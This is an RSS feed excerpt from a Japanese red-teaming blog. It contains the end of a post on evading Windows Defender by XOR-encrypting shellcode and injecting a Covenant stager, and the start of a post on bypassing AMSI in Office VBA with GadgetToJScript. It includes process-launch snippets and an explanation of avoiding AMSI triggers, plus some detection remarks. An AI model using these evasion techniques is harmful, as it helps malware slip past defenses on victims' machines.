&lt;p&gt;これでだいたいクラウド保護の検知は回避できます。ただダメ押しでもうひとつ工夫してみましょう。&lt;/p&gt;
&lt;h3 id=&#34;シェルコードを暗号化する&#34;&gt;シェルコードを暗号化する&lt;/h3&gt;
&lt;p&gt;今回はシェルコードを事前にXORで暗号化することにしました。シェルコードをXORで暗号化するテクニックは簡単な割にファイル検知エンジンにはとても有効なので覚えておくと良いでしょう。これなら万が一検知されても鍵を変更すればシェルコードを使いまわせるようになります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0x64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;loader.bin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$enc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$byte&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[IO.File]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$byte&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-bxor&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ローダにXOR復号するコードを入れました。修正後の Main()は以下のようになります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donuttest_fix.png&#34; alt=&#34;donuttest_fix&#34;&gt;
&lt;/p&gt;
&lt;p&gt;これをコンパイルして、実行してみます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donuttest_cloud_notdetect.png&#34; alt=&#34;donuttest_cloud_notdetect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;実行できました！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;クラウド保護を含んだWindows Defenderを全て検知回避してGruntをアクティベーションできました。&lt;/p&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;今回はCovenant Stagerの実行ファイルを例にしてWindows Defenderのファイル検知回避および簡単なAMSIバイパスについて説明しました。&lt;/p&gt;
&lt;h3 id=&#34;検知について&#34;&gt;検知について&lt;/h3&gt;
&lt;p&gt;今回は実行ファイルであるローダからメモ帳のプロセスにCreateRemoteThreadを使って .NET プログラムをインジェクションしました。&lt;br&gt;
CreateRemoteThread は通常のアプリケーションではめったに使われないので、ふるまい検知の点でみると非常に目立ち、EDR製品に検知される可能性が高いです。&lt;/p&gt;
&lt;p&gt;また、メモ帳のプロセスでStagerを動作させるのも不審です。理由はシンプルで、Stagerは .NET アセンブリであり、アンマネージドコードのプログラムであるメモ帳が途中でCLRを読み込むのは滅多にないことだからです。&amp;ldquo;CLR Injection&amp;quot;は、SysmonやETWを利用して検出可能であることをDonutの製作者であるTheWover氏が指摘しています。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the companion projects for donut is ModuleMonitor. It uses WMI Event Win32_ModuleLoadTrace to monitor for module loading. It provides filters, detailed data, and has an option to monitor for CLR Injection attacks.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://thewover.github.io/Introducing-Donut/&#34;&gt;https://thewover.github.io/Introducing-Donut/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;興味のある方は引用元のリンクを確認してください。&lt;/p&gt;
&lt;h3 id=&#34;その他&#34;&gt;その他&lt;/h3&gt;
&lt;p&gt;去年勉強のために色々なWebサイトを回り2020年時点で使えるとされる手法を学びましたが、結構大変だったので後進のためにここに残しておきました。&lt;/p&gt;
&lt;p&gt;あとこの資料を作成したのが2020年10月ですが、これ作った後にOffensive Securityで同じ検知回避をテーマにしたトレーニング(PEN-300/OSEP)が始まったので、資料の価値が薄れてしまった感がある（辛い）&lt;/p&gt;
&lt;p&gt;ただPEN-300は受けてないので実際内容が被っているかどうかはわかりません😅&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>検知回避の手法 - 実行ファイル</title>
        <link>https://www.shutingrz.com/post/avoid-detection-dotnet/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>GadgetToJScript を利用した Office VBA のAMSI バイパスと原理</title>
      <link>https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/</link>
      <pubDate>Mon, 16 Nov 2020 18:41:10 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/</guid>
      <description>&lt;p&gt;しゅーとです。普段は IoT 機器のリバースエンジニアリングを生業としていますが、最近は流行に乗ってRed Teaming の研究もしています。&lt;/p&gt;
&lt;p&gt;今回は WSH (vbs, js, hta) と Office マクロ事情を追ってみました。&lt;/p&gt;
&lt;p&gt;WSH (Windows Script Host) は Windows に搭載されているスクリプトエンジンで、VBScript と JScript を実行できます。 Office マクロで動作する機能・言語は様々ありますが、一般的なのは VBA (Visual Basic for Application) です。WSH、特に VBScript と VBA は構文はほとんど同じですが、実行環境は割と違っていたりします。&lt;/p&gt;
&lt;h2 id=&#34;ステルス性の高いデシリアライズ手法&#34;&gt;ステルス性の高いデシリアライズ手法&lt;/h2&gt;
&lt;p&gt;ここ数年の Red Teaming では .NET プログラムを利用したオペレーションが流行っています。&lt;/p&gt;
&lt;p&gt;セキュリティ侵害 の初期侵入は様々な経路が存在しますが、特に Windows ユーザの被害が大きいと考えられるのは Office マクロを用いたマルウェア感染です。&lt;a href=&#34;https://attack.mitre.org/&#34;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; からマルウェア感染のパターンを調査したところ、プロセス生成やプロセスインジェクションを伴わないステルスな手法として「&lt;strong&gt;デシリアライズによる .NET プログラムの実行&lt;/strong&gt;」を行っているアクターがいくつか存在しました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cactustorch-fileless-threat-abuses-net-to-infect-victims/&#34;&gt;CactusTorch Fileless Threat Abuses .NET to Infect Victims&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/SideWinder/11-10-2019/Analysis.md&#34;&gt;The SideWinder campaign continue&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.malwarebytes.com/malwarebytes-news/2020/10/kraken-attack-abuses-wer-service/&#34;&gt;Release the Kraken: Fileless injection into Windows Error Reporting service&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;デシリアライズ手法を用いるビルダーとして有名なものとして、「DotNetToJScript」(以降、D2JS) が存在します。しかし、本ツールは .NET 4.8 で対策され、&lt;strong&gt;現在の Windows 環境では利用できません&lt;/strong&gt;。しかし今では .NET 4.8 に対応したツール「GadgetToJScript」(以降、G2JS) が登場しており、これから先もステルス性の高い侵害手法として利用されることが予想されます。しかし D2JS、特に G2JS の具体的な原理については日本語ではおろか海外文献でもまとまった資料がありません。&lt;/p&gt;
&lt;p&gt;本記事では実際に Office マクロのセキュリティ機構、.NET プログラムのデシリアライズ手法の検証を行い、D2JS の対策と、それをバイパスする G2JS の手法を説明し、最後に検知に関する観点を記載します。&lt;/p&gt;
&lt;h1 id=&#34;vba-で-net-プログラムを実行する手法&#34;&gt;VBA で .NET プログラムを実行する手法&lt;/h1&gt;
&lt;p&gt;デシリアライズ手法の前に、まずは VBA でどうやって .NET プログラムを実行するか、簡単な手法から紹介します。&lt;/p&gt;
&lt;h2 id=&#34;プロセス実行&#34;&gt;プロセス実行&lt;/h2&gt;
&lt;p&gt;WSH / VBA には当然プログラムを指定して実行する機能が存在します。&lt;/p&gt;
&lt;h3 id=&#34;wscriptshell-経由&#34;&gt;WScript.Shell 経由&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;CreateObject(&amp;#34;WScript.Shell&amp;#34;).Run &amp;#34;calc.exe&amp;#34;
CreateObject(&amp;#34;WScript.Shell&amp;#34;).Exec &amp;#34;notepad.exe&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Shell オブジェクトを生成してプログラムを実行する一番ベーシックな方法です。JScript では ActiveXObject を利用して同様の操作が可能です。&lt;/p&gt;
&lt;p&gt;これを使って .NET プログラムを呼び出せばいいですし、PowerShell を呼び出せばそこからスクリプトを使ってファイルレスで .NET プログラムを読み込むことができます。下は .NET の MessageBox を実行する PowerShell コードです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/wshshell_powershell.png&#34; alt=&#34;wshshell_powershell&#34;&gt;
&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/net_from_ps_from_wsh.png&#34; alt=&#34;net_from_ps_from_wsh&#34;&gt;
&lt;/p&gt;
&lt;p&gt;この方法であれば、PowerShell 側で検知回避をすることで何の障害もなく .NET プログラムを読み込み可能です。&lt;/p&gt;
&lt;p&gt;Emotet ダウンローダーをはじめとした Office マクロを悪用したマルウェアは、だいたいこの手法を使ってマルウェアをダウンロードし実行しています。（コードを難読化しているくらいです）&lt;/p&gt;
&lt;p&gt;じゃあそれ使えば解決ではないか、という声が聞こえてきそうです。はい。現時点の世界のセキュリティ対策の主流ではこれでいけます。ただ PowerShell プロセスの生成を行っているので次世代の EDR 製品にはかなりの確率で検知されます。&lt;/p&gt;
&lt;h3 id=&#34;wmi-経由&#34;&gt;WMI 経由&lt;/h3&gt;
&lt;p&gt;オブジェクトを生成して利用するほかに、既にコンピュータで生成されている WMI の Win32_Process オブジェクトを呼び出してプログラムを実行する方法があります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;winmgmts:\\.\root\cimv2:Win32_Process&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;calc.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intProcessID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;こちらは WMI を利用するため、Winmgmt サービスが実行している必要があります。なおこちらもプロセス生成が行われます。&lt;/p&gt;
&lt;h3 id=&#34;com-オブジェクト経由&#34;&gt;COM オブジェクト経由&lt;/h3&gt;
&lt;p&gt;Windows に多数登録されている COM オブジェクトを利用してプロセスを生成することもできます。&lt;/p&gt;
&lt;p&gt;ShellWindows オブジェクト は  Document.Application プロパティを持っていますが、このプロパティには ShellExecute メソッドという任意のプロセスを生成するメソッドを持っています。このプロパティを通して ShellExecute メソッドを呼ぶことでプログラムを実行できます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/vba_com_exec.png&#34; alt=&#34;vba_com_exec&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;9BA05972-F6A8-11CF-A442-00A0C90A8F39&lt;/code&gt; は ShellWindows オブジェクトの CLSID です。&lt;/p&gt;
&lt;p&gt;これまで紹介した WScript.Shell および WMI 経由のプロセス生成は、Office マクロで利用する際は Office プログラム(winword.exe, excel.exe)の子プロセスとして実行されます。&lt;/p&gt;
&lt;p&gt;Windows にはシステムの堅牢性を上げるために、 &lt;strong&gt;Exploit Protection&lt;/strong&gt; という機能が存在します。この機能には、指定したプログラムによる子プロセス生成を防止する項目が存在します。そのため Exploit Protection にて子プロセスの生成を防止していた場合、実行がブロックされます。しかしこの方法であれば COM オブジェクト経由で実行されるため、COMオブジェクトを持つプロセスが親プロセスとなり、Exploit Protection の制限をバイパス可能です。なお ShellWindows オブジェクトを公開しているのは  explorer.exe なので、 explorer.exe が親プロセスとなります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/shellwindows_process.jpg&#34; alt=&#34;shellwindows_process&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;COM オブジェクトを利用したプロセス生成は他にも様々ありますが、ここでは省略します。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;しかしこのコードは、Windows Defender (+クラウド提供による保護) を有効にしていると、実行時に検知され、実行できません。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/detect_mal_macro.png&#34; alt=&#34;detect_mal_macro&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このようにファイル生成時には検知しなくても、実行時に検知するのは &lt;strong&gt;AMSI&lt;/strong&gt; によるものです。&lt;/p&gt;
&lt;h2 id=&#34;vbaとamsi&#34;&gt;VBAとAMSI&lt;/h2&gt;
&lt;p&gt;ここまでに複数の方法でプロセスを起動する方法を書いてきました。&lt;/p&gt;
&lt;p&gt;最初の &lt;code&gt;CreateObject(&amp;quot;WScript.Shell&amp;quot;)&lt;/code&gt;  は実際の業務でも利用されることもありアンチウイルスソフトでは検知されませんが、最後の COM オブジェクトを使ったプロセス実行手法は VBA では通常利用されることは少なく、こういったコードが含まれている xlsm ファイルはマクロ実行時にアンチウイルスソフトに検知されることがあります。&lt;/p&gt;
&lt;h3 id=&#34;vba-の-amsi-スキャンエンジン&#34;&gt;VBA の AMSI スキャンエンジン&lt;/h3&gt;
&lt;p&gt;上の COM オブジェクトの単純な呼び出しに関しては問題ありませんが、実際に CreateThread などコードインジェクションを行うようなコードは、ファイルを生成された時点でアンチウイルスソフトに検知されます。以下は metasploit で生成した、&lt;code&gt;net user&lt;/code&gt; を実行させるシェルコードを含んだ VBA です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/create_thread_net_vba.png&#34; alt=&#34;create_thread_net_vba&#34;&gt;
&lt;/p&gt;
&lt;p&gt;以下のようにファイル作成時、Windows Defender に検知されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/create_thread_net_vba_detect.png&#34; alt=&#34;create_thread_net_vba_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このような場合に攻撃者がとる行動は、より高度な難読化です。難読化を行うことでファイルに対する検知を回避することが可能です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/obf_create_thread_net_vba.png&#34; alt=&#34;obf_create_thread_net_vba&#34;&gt;
&lt;/p&gt;
&lt;p&gt;しかしファイルに対する検知回避だけでは不十分です。VBA は実行時に、VBA エンジン(VBE7.DLL) に搭載されている &lt;strong&gt;AMSI&lt;/strong&gt; によって API 呼び出し直前の状態でマッチングされてしまいます。下記は API Monitor で excel.exe の &lt;code&gt;AmsiScanString&lt;/code&gt; 呼び出しにブレークポイントを設置し、実行時にブレークされたときの画面です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/apimonitor_break.png&#34; alt=&#34;apimonitor_break&#34;&gt;
&lt;/p&gt;
&lt;p&gt;AmsiScanString() の2つ目の引数から、VirtualAlloc の呼び出し時点の引数が全て復元された状態でスキャンが動作していることがわかります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;kernel32.VirtualAlloc(0000000000000000,000000000000011f,0000000000001000,0000000000000040);
kernel32.RtlMoveMemory(,H,0000000000000001);
kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;AMSI&lt;/strong&gt; とは Antimalware Scan Interfaceの略で、アンチウイルスソフトに依存しない、悪意のあるコンテンツをスキャンするインターフェースです。アンチウイルスソフトは AMSI を利用して&lt;strong&gt;メモリ&lt;/strong&gt;上に読み込まれるコンテンツをスキャンできます。&lt;/p&gt;
&lt;p&gt;AMSI が動作するランタイムは複数あり、現在は PowerShell, WSH, VBA, .NET のランタイム用エンジンが存在します。これらのランタイムによってそれぞれエンジンの動作は異なります。&lt;/p&gt;
&lt;p&gt;VBA エンジンでは COM オブジェクトや Win32API の全ての呼び出しがふるまいログとして記録され、特定のトリガーによって AMSI プロバイダーにスキャンされるようになっています。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/fig2-runtime-scanning-amsi-8.png&#34; alt=&#34;fig2-runtime-scanning-amsi-8&#34;&gt;
&lt;/p&gt;
&lt;p&gt;これらの動作の詳細は &lt;a href=&#34;https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/&#34;&gt;Microsoft が解説&lt;/a&gt;しています。&lt;/p&gt;
&lt;h3 id=&#34;bypass-amsi&#34;&gt;Bypass AMSI&lt;/h3&gt;
&lt;p&gt;しかし VBA エンジン (VBE7.DLL) にはいくつかの穴が存在します。COM オブジェクト、Win32API の呼び出しでログが記録されますが、その呼び出しに AMSI のトリガーとなる文字列が含まれなければ AMSI スキャンは走らないのです。&lt;/p&gt;
&lt;p&gt;下記は &lt;a href=&#34;https://github.com/synacktiv/AMSI-Bypass&#34;&gt;Synactiv が公開した&lt;/a&gt;、AMSI トリガーとなる Win32API および COM オブジェクトのメソッド名の一部です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Win32API&lt;br&gt;

  &lt;img src=&#34;images/amsi_trigger_win32.png&#34; alt=&#34;amsi_trigger_win32&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;COM Object&lt;br&gt;

  &lt;img src=&#34;images/amsi_trigger_com.png&#34; alt=&#34;amsi_trigger_com&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これは VBE7.DLL をリバースエンジニアリングしてトリガーとなる CRC32 ハッシュを抽出し、文字列と突合したものです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ここに記載したのは一部であり、Synactiv が作成したリストの全ては当該リンクを確認してください。ただしリンク先のリストは全てのトリガーをカバーした完全なデータではありません。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;このように VBA の AMSI エンジンは完全ではなく、トリガーに引っかからない API のみを利用すれば AMSI バイパスが行えることがわかります。しかしリストには侵害時によく利用するものが含まれているので、そのまま API を呼び出して侵害を行うのは困難です。&lt;/p&gt;
&lt;p&gt;これの対抗策として 攻撃者・RedTeamer は複数の手法を開発しています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外部プログラムにメイン処理を丸投げ
&lt;ul&gt;
&lt;li&gt;PowerShell に引数を与えて実行  (→大多数のダウンローダが行う手法)&lt;/li&gt;
&lt;li&gt;悪性ファイルをドロップして何らかの方法で実行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VBA でメイン処理を行わない
&lt;ul&gt;
&lt;li&gt;DDE、Excel4.0 は AMSI に対応していないため AMSI を気にしなくてよくなる&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AMSI にトリガーされないように工夫して侵害を行う&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これらの手法には一長一短があります。特に一番最初の丸投げ手法は VBA の実装が楽な分、プロセス生成を伴ったりファイルのドロップが必要になるケースがあって、別のスキャン手法で検知される可能性が高いです。&lt;/p&gt;
&lt;p&gt;最後の AMSI トリガーを回避する手法は実装が大きくなりがちですが、一度回避手法を確立してしまえば対策されるまでは非常に有効な手段になります。&lt;/p&gt;
&lt;p&gt;ちなみに2つ目の DDE, Excel4.0 は現在は有効なパターンが多いですが、最近のアンチウイルスソフトはこれらを多く利用している時点で検知してくるようなので銀の弾丸というわけでもありません。&lt;/p&gt;
&lt;p&gt;今回紹介する GadgetToJScript (G2JS) は工夫して侵害するパターンです。ただし基本的な実装は G2JS 側で肩代わりしてくれるので、利用者側は難読化処理を施すだけで利用可能です。&lt;/p&gt;
&lt;h1 id=&#34;gadgettojscript-を利用した-net-プログラムの読み込み&#34;&gt;GadgetToJScript を利用した .NET プログラムの読み込み&lt;/h1&gt;
&lt;p&gt;今回メインとなる話がこれです。&lt;/p&gt;
&lt;p&gt;プロセス生成の項で、WSH が GetObject (VBScript) あるいは ActiveXObject (JScript) を使って、COM オブジェクトを利用できることを示しました。&lt;/p&gt;
&lt;p&gt;この手法は、COM オブジェクトを経由して .NET オブジェクトを読み込むことができないかという発想からきています。根本的な原理については &lt;a href=&#34;&#34;&gt;James Forshaw 氏のブログ記事&lt;/a&gt;を読むと理解が進むのでぜひ読んでください。&lt;/p&gt;
&lt;p&gt;この手法は COM オブジェクトを操作できるあらゆるプログラミング言語で適用できます。氏のブログでは C# で PoC が書かれていましたが、それを WSH / VBA でもかけるという話です。&lt;/p&gt;
&lt;h2 id=&#34;デシリアライズの原理&#34;&gt;デシリアライズの原理&lt;/h2&gt;
&lt;p&gt;D2JS、G2JS の説明の前に、本記事でも C# で実際に &amp;ldquo;Hello, World&amp;rdquo; という値を持つ String オブジェクトをシリアライズ・デシリアライズできることを確認してみましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.IO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Runtime.Serialization&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Runtime.Serialization.Formatters.Binary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;    Ref:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;    https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;    https://github.com/med0x2e/GadgetToJScript
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;    https://silentbreaksecurity.com/re-animating-activitysurrogateselector/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;**/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Definitely non-serializable class.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;NonSerializable&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NonSerializable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
